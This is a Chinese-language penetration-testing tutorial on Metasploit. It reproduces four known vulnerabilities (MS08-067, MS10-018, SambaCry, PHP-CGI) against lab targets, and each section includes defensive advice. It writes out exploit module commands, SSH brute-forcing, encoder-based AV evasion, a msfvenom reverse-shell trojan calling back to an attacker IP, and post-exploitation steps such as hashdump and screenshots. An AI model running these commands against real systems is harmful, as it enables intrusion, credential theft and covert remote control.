---
title: MSF的使用以及漏洞复现
date: 2026-07-11 12:00:00
categories:
  - Web安全
  - 渗透测试
tags:
  - MSF
  - 渗透测试
description: MSF渗透测试框架的使用方法、常见漏洞复现（MS08-067、MS10-018、CVE-2017-7494、CVE-2012-1823）及msfvenom木马生成
---

# 一、MSF 是什么？
## (一) 基础概述
**定义**：Metasploit Framework（MSF）是开源全能渗透测试框架，覆盖信息收集、漏洞探测、漏洞利用全流程，内置2000+漏洞模块并持续更新，被称为渗透行业核心工具。

**主要功能**：漏洞利用、生成攻击载荷、监听反弹连接、后渗透控制； 常用组件为`msfconsole`交互控制台、`msfvenom`后门生成工具。  

**安装目录（Kali默认）**  
`/usr/share/metasploit-framework/`

![](/img/posts/MSF的使用以及漏洞复现/img1.png)

## (二) 核心目录分工
| 目录 | 核心作用 |
| --- | --- |
| modules | MSF核心武器库，存放所有渗透模块 |
| data | 字典、Payload模板、资源素材 |
| plugins | 扩展插件，增强联动、扫描能力 |
| scripts | Meterpreter、自动化渗透脚本 |
| tools | 独立编码、漏洞分析小工具 |

## (三) modules六大子模块详解

![](/img/posts/MSF的使用以及漏洞复现/img2.png)

### 1. Auxiliary 辅助模块
+ 目录：modules/auxiliary/
+ 作用：不执行漏洞提权、不反弹shell；信息收集、扫描、爆破、嗅探、验证
+ 特点：无payload，单纯工具类，绝大多数不需要目标存在漏洞
+ 常见分类：
    - 端口扫描：`auxiliary/scanner/portscan/tcp`
    - 弱口令爆破：ssh、ftp、mysql、rdp爆破
    - 漏洞探测（只检测不利用）：smb版本探测、CVE漏洞扫描
    - DNS枚举、ARP嗅探、目录扫描、服务识别
+ 使用场景：前期**信息收集**阶段；探测目标是否存在漏洞，不获取权限。

示例 1：TCP 端口扫描

```bash
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.168.1.0/24   # 目标IP/网段
set PORTS 1-1000
set THREADS 10               # 线程
run
```

示例 2：SMB 版本探测（永恒之蓝前期探测）

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.105
run
```

示例 3：SSH 弱口令爆破

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/default_users_for_smb.txt
set PASS_FILE /usr/share/wordlists/metasploit/password.lst
set THREADS 5
run
```

### 2. Exploits 漏洞利用模块（EXP）
+ 目录：modules/exploits/
+ 作用：利用程序漏洞触发内存溢出、命令执行、文件上传等缺陷，开辟通道
+ 特点：必须搭配Payload使用！exp负责打通漏洞通道，payload负责执行代码
+ 原理：漏洞本身只能制造程序异常，不知道要执行什么操作；exp = 开锁，payload = 你要放进房间的指令（反弹shell、创建用户等）
+ 分类：
    - Windows漏洞：MS08-067、MS17-010（永恒之蓝）
    - Web漏洞：远程代码执行RCE
    - 各类应用漏洞：Tomcat、Apache、路由器漏洞

### 3. Payloads 攻击载荷（Shellcode）
+ 目录：modules/payloads/
+ 作用：漏洞利用成功后，在目标机器上最终执行的代码
+ Payload三大类型
    1. **Single**  
完整代码一体，不需要外部连接，一次性执行。  
例：`windows/adduser` → 直接在目标新建管理员账号
    2. **Stager**  
体积短小，先运行小段代码，**主动回连攻击机**，再下载完整shellcode。  
优点：体积小，容易绕过缓冲区长度限制  
典型：`reverse_tcp` 反向连接
    3. **Stage**  
Stager连接成功后，后续下载运行的大代码，如Meterpreter
+ 高频Payload：
    - `windows/meterpreter/reverse_tcp` Windows反向Meterpreter（最常用）
    - `linux/x86/meterpreter/reverse_tcp` Linux反弹
    - `cmd/unix/reverse_netcat` 简易nc反弹shell

> Meterpreter属于高级payload，内存运行、无落地文件、功能极强
>

### 4. Encoders 编码器（免杀编码）
+ 目录：modules/encoders/  
作用：对payload进行编码变形，规避杀毒软件、IDS、防火墙特征检测
+ 核心原理：原始shellcode存在固定特征，容易被AV查杀；编码器替换字符、改变二进制序列，运行时自动解码还原。
+ 经典编码器：`x86/shikata_ga_nai` 万花筒编码器

```bash
# msfvenom示例，编码5次
msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell.exe
```

### 5. Nops 空指令模块（NOP生成器）
+ 目录：modules/nops/

> NOP = No Operation，CPU空指令 `0x90`  
**作用：生成一串无任何功能的空指令，填充缓冲区，用于缓冲区溢出漏洞开发**
>

+ 原理：溢出利用时，很难精准命中shellcode起始地址；大量`0x90`滑行区，只要跳转进NOP区域，CPU一路空滑，最终执行payload。
+ 适用场景：**漏洞研究、自行编写EXP**

### 6. Post 后渗透模块
+ 目录：modules/post/
+ 触发时机：已经拿到目标权限（Meterpreter会话）之后使用， 依赖 SESSION。
+ 作用：权限维持、信息窃取、内网横向移动、提权、痕迹清理
+ 常用分类：
    1. 权限提升：`post/windows/escalate/getsystem`
    2. 信息收集：获取密码、浏览器记录、系统账号、进程
    3. 持久化后门：创建服务、注册表自启动
    4. 内网渗透：ARP扫描、路由转发、抓取凭证
    5. 清除日志、dump内存密码（mimikatz集成在内）
+ 使用方式：

方式1：meterpreter会话内直接run

```bash
run post/windows/gather/hashdump
```

方式2：background会话后use调用

```bash
background			# 将会话放到后台，得到session编号
sessions        # 查看所有会话

use post/windows/gather/credentials/windows_autologin
set SESSION 1		# 指定使用哪一条meterpreter会话
run
```

# 二、MSF控制台基础命令
| 命令 | 功能 |
| --- | --- |
| `msfconsole` | 启动MSF交互控制台 |
| `?` | 查看全部帮助指令 |
| `search 关键词/CVE` | 检索漏洞、EXP模块 |
| `use 模块路径` | 加载对应漏洞模块 |
| `back` | 退出当前模块，返回主控制台 |
| `show options` | 查看模块必填参数 |
| `set 参数 值` | 配置目标IP、端口、载荷等 |
| `info` | 查看模块漏洞详情、作者、适用系统 |
| `connect ip 端口` | 简易端口连接，类似nc/telnet |
| `jobs` | 查看后台监听、攻击任务 |
| `run / exploit` | 执行漏洞攻击 |
| `sessions` | 查看所有被控主机会话 |
| `sessions -i ID` | 进入指定会话交互 |
| `exit / quit` | 退出会话或MSF控制台 |

### 1. msfconsole

![](/img/posts/MSF的使用以及漏洞复现/img3.png)

### 2. ？

![](/img/posts/MSF的使用以及漏洞复现/img4.png)

### 3. search

![](/img/posts/MSF的使用以及漏洞复现/img5.png)

### 4. use

![](/img/posts/MSF的使用以及漏洞复现/img6.png)

### 5. exit

![](/img/posts/MSF的使用以及漏洞复现/img7.png)

# 三、MSF 渗透测试
## (一) MS08-067
### 1. 简介
**MS08-067** 是Windows XP及部分旧版本Windows系统中著名的**远程代码执行漏洞**（CVE-2008-4250），存在于 **Server服务的RPC请求处理** 中。

攻击者可通过 **SMB（端口445）** 发送特制RPC请求，触发 _NetPathCanonicalize_ 函数的缓冲区溢出，从而在**无需身份验证**的情况下执行任意代码。该漏洞曾被蠕虫病毒 **Conficker** 大规模利用。

### 2. 命令行汇总
```bash
# 1. 静默启动MSF控制台
msfconsole -q
# 2. 检索MS08-067漏洞模块
search ms08-067
# 3. 加载漏洞利用模块
use exploit/windows/smb/ms08_067_netapi
# 4. 查看模块所需配置参数
show options
# 5. 设置受害机IP
set RHOSTS xxxx
# 6. 执行漏洞攻击
run
# 7. 成功进入meterpreter后调出系统cmd命令行
shell
# 8. 返回meterpreter控制台
exit
```

### 3. 攻击步骤
**环境**：WinXP SP3，445端口开放

**前提条件**：已知目标机的 IP 地址 192.168.23.136

![](/img/posts/MSF的使用以及漏洞复现/img8.png)

1. 启动 MSF 框架，准备攻击，执行 msfconsole 命令

```bash
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/img9.png)

2. 加载漏洞模块，配置攻击参数

```bash
search MS08-067
```

![](/img/posts/MSF的使用以及漏洞复现/img10.png)

```bash
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/img11.png)

```bash
show options
```

![](/img/posts/MSF的使用以及漏洞复现/img12.png)

设置目标 IP 地址

```bash
set RHOSTS 192.168.23.136
```

![](/img/posts/MSF的使用以及漏洞复现/img13.png)

3. 执行攻击，获取系统权限

```bash
run
```

![](/img/posts/MSF的使用以及漏洞复现/img14.png)

```bash
shell
```

![](/img/posts/MSF的使用以及漏洞复现/img15.png)

### 4. 防御
+ 安装KB958644补丁
+ **关闭445端口** 或限制SMB服务对外访问。
+ 部署**防火墙与入侵检测系统**，过滤异常RPC/SMB流量。
+ 定期进行漏洞扫描与系统加固，避免使用已停止支持的操作系统。

## (二) MS10-018 IE浏览器
### 1. 简介
MS10-018是IE浏览器上的漏洞，主要危害Internet Explorer 6和Internet Explorer 7。 

利用方式：MSF搭建恶意网页服务，生成钓鱼URL诱导目标访问，后台监听等待上线

### 2. 命令行汇总
```bash
# 1. 静默启动MSF
msfconsole -q
# 2. 搜索MS10-018 IE漏洞模块
search ms10-018
# 3. 加载IE溢出利用模块
use exploit/windows/browser/ms10_018_ie_behaviors
# 4. 查看模块配置项
show options
# 5. 设置攻击机本机IP（生成钓鱼网页地址）
set SRVHOST xxxx
# 6. 选用正向连接载荷
set PAYLOAD windows/meterpreter/bind_tcp
# 7. 自定义受害机监听端口，规避4444默认特征
set LPORT xxx
# 8. 启动攻击服务
run
# 9. 查看所有被控主机会话
sessions
# 10. 接入ID为1的受害机会话
sessions -i 1
# 11. 调出目标系统cmd命令行
shell
# 12. 切回meterpreter
exit
```

### 3. 攻击步骤
**环境**：WinXP IE6/7

**前提条件**：已知目标机的 IP 地址 192.168.23.136

![](/img/posts/MSF的使用以及漏洞复现/img8.png)

1. 启动 MSF，准备攻击，执行 msfconsole 命令

```bash
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/img16.png)

2. 加载漏洞模块

```bash
search MS10-018
```

![](/img/posts/MSF的使用以及漏洞复现/img17.png)

```bash
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/img18.png)

3. 设置 payload 正向连接 shell

```basic
set PAYLOAD windows/meterpreter/bind_tcp
```

补充：

| Payload 类型 | 名称 | LPORT 含义 | 连接发起方 |
| --- | --- | --- | --- |
| bind_tcp | 正向连接 shell | **靶机监听端口** | 攻击机主动连接靶机 |
| reverse_tcp | 反向反弹 shell | **攻击机监听端口** | 靶机主动外联攻击机 |

bind_tcp 正向 shell 缺点

+ 需要靶机防火墙**允许入站连接**（防火墙开启大概率直接失败）
+ 靶机会新增监听端口，容易被端口扫描发现异常

4. 配置攻击参数，查看要设置哪些东西

```bash
show options
```

![](/img/posts/MSF的使用以及漏洞复现/img19.png)

查看攻击机的 IP 192.168.23.131

![](/img/posts/MSF的使用以及漏洞复现/img20.png)

设置攻击机的 IP 地址

```bash
set SRVHOST 192.168.23.131
```

![](/img/posts/MSF的使用以及漏洞复现/img21.png)

修改 bind_tcp 载荷 LPORT，即自定义受害机监听端口

作用：

+ 避免默认 4444 端口被占用导致监听失败
+ 规避知名恶意端口特征，降低流量被安全设备检测发现的概率。

```bash
set LPORT 9999
```

![](/img/posts/MSF的使用以及漏洞复现/img22.png)

5. 启动攻击服务

```bash
run
```

![](/img/posts/MSF的使用以及漏洞复现/img23.png)

出现的 url 要通过社工等方法让目标机进行访问。这里我们直接让目标机访问这个 url

![](/img/posts/MSF的使用以及漏洞复现/img24.png)

![](/img/posts/MSF的使用以及漏洞复现/img25.png)

回车

6. 查看后台任务与对话

```bash
sessions
```

![](/img/posts/MSF的使用以及漏洞复现/img26.png)

进入这个会话 1（i 就是 in，1 表示会话的 id）

```bash
sessions -i 1
```

![](/img/posts/MSF的使用以及漏洞复现/img27.png)

出现 `meterpreter >` 提示符，**代表漏洞利用成功、已和受害机建立控制通道**，可以对目标进行操作。

7. 执行 shell 启动命令行

```bash
shell
```

![](/img/posts/MSF的使用以及漏洞复现/img28.png)

### 4. 防御
+ 安装KB980182补丁
+ 禁用危险ActiveX
+ 开启DEP/ASLR内存保护。

## (三) CVE-2017-7494 SambaCry（Linux永恒之蓝）
### 1. 简介
CVE-2017-7494，也被称为 Linux 版的永恒之蓝，是一个在 Samba 服务中发现的远程代码执行漏洞。Samba 是一种在 Linux 和 Unix 系统上实现 SMB 协议的自由软件，允许这些系统与 Windows 系统进行文件共享。该漏洞影响了 Samba 版本 3.5.0 到 4.6.4、4.5.10 和 4.4.14 之间的版本。  

漏洞的核心在于 Samba 的 `is_known_pipename () `函数中存在字符过滤问题 ，导致攻击者可以向共享目录传递恶意文件，从而被远程代码执行。  

### 2. 命令行汇总
```bash
# 1. 启动MSF控制台 
msfconsole -q 
# 2. 搜索漏洞模块 
search CVE-2017-7494 
# 3. 加载漏洞利用模块 
use exploit/linux/samba/is_known_pipename 
# 4. 设置目标IP 
set RHOSTS xxxx 
# 5. 执行攻击 
run
```

### 3. 攻击步骤
+ **环境搭建**：Vulhub搭建Samba 3.5~4.6.4
    - 搭建 Vulhub 靶场前提：Ubuntu 宿主机预先安装 git、docker、docker-compose；通过 git 下载 vulhub 源码包；操作时切换 root 权限，进入对应漏洞目录，执行`docker-compose up -d`后台启动漏洞容器。  
    - 部署教程：[https://blog.csdn.net/m0_73909316/article/details/142954056](https://blog.csdn.net/m0_73909316/article/details/142954056)
+ **利用条件**：
    - 服务器共享目录具有访问权限。
    - 要对服务器上写一个文件，并知道其绝对路径。
    - 系统开启了文件/打印机共享端口445。

1. 启动靶机

```bash
# 切换root管理员权限
su root
```

![](/img/posts/MSF的使用以及漏洞复现/img29.png)

提示符变为 `root@ubuntu#` 代表切换成功

```bash
# 进入 vulhub 中Samba漏洞目录（目录内要有docker-compose.yml）
cd /home/enjoy/vulhub-master/samba/CVE-2017-7494
```

```bash
# 后台启动漏洞容器
docker-compose up -d
```

![](/img/posts/MSF的使用以及漏洞复现/img30.png)

注：实验结束，关闭销毁靶场

```bash
# 需要在漏洞对应目录执行
docker-compose down
```

作用：停止并删除容器，释放端口，防止端口冲突

2. 查看靶机的 IP 地址 192.168.23.135

```bash
ifconfig
```

![](/img/posts/MSF的使用以及漏洞复现/img31.png)

3. 启动 MSF

```bash
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/img32.png)

4. 搜索漏洞模块

```bash
search CVE-2017-7494
```

![](/img/posts/MSF的使用以及漏洞复现/img33.png)

5. 加载SambaCry漏洞的攻击模块

```bash
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/img34.png)

6. 查看当前模块需要配置的参数

```bash
show options
```

![](/img/posts/MSF的使用以及漏洞复现/img35.png)

7. 设置远程受害主机IP

```bash
set RHOSTS 192.168.23.135
```

![](/img/posts/MSF的使用以及漏洞复现/img36.png)

8. 执行攻击

```bash
run
```

9. 启动命令行

```bash
id
```

![](/img/posts/MSF的使用以及漏洞复现/img37.png)

### 4. 防御
+ 升级Samba版本
+ 禁用nt pipe
+ 共享目录设只读
+ 防火墙限制445端口。

## (四) CVE-2012-1823（PHP CGI漏洞利用）
### 1. 简介
CVE-2012-1823 是 PHP-CGI 模式 下的高危远程代码执行漏洞，影响 PHP < 5.3.12 和 PHP < 5.4.2 版本。当 PHP 以 CGI 模式运行时，QUERY_STRING 中的参数会被直接当作 php-cgi 命令行参数 解析，从而允许攻击者传入 -s、-d、-c 等开关，实现**源码泄露**或**任意代码**执行。  
漏洞成因 根据 RFC3875 规范，当 QUERY_STRING 中不包含 = 时，Web 服务器会将其作为命令行参数传递给 CGI 程序。PHP 在 CGI SAPI 中未正确过滤这些参数，导致攻击者可构造恶意 URL 直接传递命令行选项。

### 2. 命令行汇总
```bash
# 1. 启动MSF控制台
msfconsole

# 2. 搜索漏洞模块 
search CVE-2012-1823

# 加载PHP-CGI参数注入EXP模块
use exploit/multi/http/php_cgi_arg_injection

# 设置目标IP（Ubuntu靶机地址）
set RHOSTS xxxx

# 设置目标端口
set RPORT 8080

# 执行漏洞攻击
run

# 成功获取会话后，调取目标系统原生命令行
shell

# 查看当前系统权限
id
```

### 3. 攻击步骤
+ **环境搭建：** 靶机vulhub
1. 启动靶场

```bash
# 停止旧容器
docker-compose down

# 切换root管理员权限
su root

# 切换至漏洞目录
cd /home/enjoy/vulhub-master/php/CVE-2012-1823

# 构建镜像（首次启动环境执行）
docker-compose build

# 后台启动靶场容器
docker-compose up -d

# 校验docker-compose配置是否正常（可选命令）
docker-compose config
```

![](/img/posts/MSF的使用以及漏洞复现/img48.png)

2. 启动 MSF

```bash
msfconsole -q
```

![](/img/posts/MSF的使用以及漏洞复现/img32.png)

3. 搜索漏洞模块

```bash
search CVE-2012-1823
```

![](/img/posts/MSF的使用以及漏洞复现/img49.png)

4. 加载漏洞攻击模块

```bash
use 0
```

![](/img/posts/MSF的使用以及漏洞复现/img50.png)

5. 查看当前模块需要配置的参数

```bash
show options
```

![](/img/posts/MSF的使用以及漏洞复现/img51.png)

6. 设置远程受害主机IP 和 端口

![](/img/posts/MSF的使用以及漏洞复现/img52.png)

```bash
set RHOSTS 192.168.23.135
set RPORT 8080
```

![](/img/posts/MSF的使用以及漏洞复现/img53.png)

7. 执行攻击

```bash
run
```

![](/img/posts/MSF的使用以及漏洞复现/img54.png)

8. 启动命令行

```bash
shell
id		#查看当前执行权限
ip addr
```

![](/img/posts/MSF的使用以及漏洞复现/img55.png)

### 4. 防御
+ 升级 PHP 到 5.3.12、5.4.2 及以上安全版本；
+ 废弃 PHP-CGI 模式，改用 PHP-FPM；
+ 在 Apache/Nginx 配置规则，拦截-d、-s等危险 URL 参数；
+ 使用低权限账号运行 PHP 程序；
+ 监控日志与进程行为，及时发现漏洞攻击尝试。

## (五) msfvenom 生成后门木马
### 1. Msfvenom 是什么？
Msfvenom是由Msfpayload和Msfencode合并而成的工具，是Metasploit框架的一部分，主要用于生成可执行的有效载荷（payload），支持多种平台和文件格式，并可与Metasploit的其他模块配合进行渗透测试和后渗透操作。

### 2. 使用场景
Msfvenom常用于**红队渗透测试**和**社会工程学攻击**中，通过生成带后门的可执行文件或脚本，诱使目标运行，从而获取控制权 。生成的payload可以直接用于Metasploit框架中建立会话，进行后续的渗透操作和横向移动

### 3. 核心参数
1. `-p` 指定使用的攻击 payload（后门类型），例如 `windows/meterpreter/reverse_tcp`
2. `LHOST` Local Host，攻击机（Kali）IP，受害机主动反弹连接这个地址
3. `LPORT` 攻击机开启监听的端口
4. `-f` 文件输出格式（elf、exe、so、raw 等）
5. `-o` 保存生成的后门文件（output）

### 4. 基础语法
```bash
msfvenom -p 载荷 LHOST=攻击机IP LPORT=监听端口 -f 格式 -o 输出文件
```

### 5. Windows木马示例
1. 查看攻击机的 IP 192.168.23.131

![](/img/posts/MSF的使用以及漏洞复现/img38.png)

2. msfvenom 生成Windows反弹木马

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.23.131 lport=9999 -f exe >hello.exe
```

+ `-p windows/meterpreter/reverse_tcp`：载荷，Windows反弹Meterpreter
+ `LHOST=192.168.23.131`：**攻击机Kali的IP**，靶机主动连接该地址
+ `LPORT=9999`：靶机连接攻击机的端口
+ `-f exe`：输出格式为Windows可执行程序
+ `> hello.exe`：将内容输出保存为hello.exe（等价 `-o hello.exe`）

![](/img/posts/MSF的使用以及漏洞复现/img39.png)

![](/img/posts/MSF的使用以及漏洞复现/img40.png)

3. 监听

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 9999
exploit -j
```

+ `msfconsole`：启动MSF交互式控制台
+ `use exploit/multi/handler`：加载监听模块，等待反弹连接(reverse_tcp）  
+ `set payload`：载荷必须**和木马生成时完全一致**
+ `set LHOST 0.0.0.0`：监听本机所有网卡
+ `set LPORT 9999`：监听端口，必须和木马端口保持统一
+ `exploit -j`：`-j` = job后台运行监听，不会占用当前窗口

![](/img/posts/MSF的使用以及漏洞复现/img41.png)

4. 把木马放到靶机并运行hello.exe，成功得到meterpreter > 后执行

![](/img/posts/MSF的使用以及漏洞复现/img42.png)

5. 查看后台任务与对话

```bash
sessions
```

![](/img/posts/MSF的使用以及漏洞复现/img43.png)

```bash
sessions -i 1
```

![](https://cdn.nlark.com/yuque/0/2026/png/65327698/1783756492637-9e1b9422-44c1-4f64-8161-eb91f065d4e5.png)

6. 实现远程控制

```bash
screenshot      # 对受害主机屏幕截图
```

![](/img/posts/MSF的使用以及漏洞复现/img45.png)

```bash
shell           # 调出目标原生cmd命令行
ipconfig
```

![](/img/posts/MSF的使用以及漏洞复现/img46.png)

```bash
run vnc         # 开启VNC远程桌面控制
```

![](/img/posts/MSF的使用以及漏洞复现/img47.png)

